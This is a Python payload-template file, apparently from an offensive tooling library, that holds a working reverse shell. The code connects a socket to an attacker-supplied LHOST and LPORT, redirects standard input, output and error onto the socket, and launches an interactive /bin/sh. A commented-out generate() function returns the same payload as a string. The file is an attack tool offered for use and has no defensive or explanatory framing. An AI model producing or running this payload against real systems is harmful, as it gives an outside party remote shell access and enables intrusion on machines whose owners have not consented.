METADATA = {
    "name": './python/base/reverse_shells/reverse_shell__diputs-sudo.py',
    "title": '',
    "description": '',
    "platform": [
        'linux',
        'macos',
    ],
    "language": '.',
    "category": 'python/base/reverse_shells',
    "tags": [],
    "chainable": True,
    "output_type": 'str',
    "import": [
        'os',
        'socket',
        'subprocess',
    ],
    "requires_addons": [],
    "dependencies": [],
    "args": [
        {
            "name": 'LHOST',
            "type": 'str',
            "required": True,
            "default": None,
        },
        {
            "name": 'LPORT',
            "type": 'int',
            "required": True,
            "default": None,
        },
    ],
    "block_type": 'template',
    "entrypoint": 'generate',
    "returns": 'str',
    "author": 'diputs-sudo',
    "version": '1.0.0',
    "created": '2025-07-09',
    "updated": '2025-07-09',
}




import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(({LHOST}, {LPORT}))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(['/bin/sh', '-i'])

# def generate(LHOST: str, LPORT: int) -> str:
#     """Return Python source code for a reverse shell."""
#     return f'''
# import socket, subprocess, os
# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# s.connect(({LHOST!r}, {LPORT}))
# os.dup2(s.fileno(), 0)
# os.dup2(s.fileno(), 1)
# os.dup2(s.fileno(), 2)
# subprocess.call(['/bin/sh', '-i'])
# '''

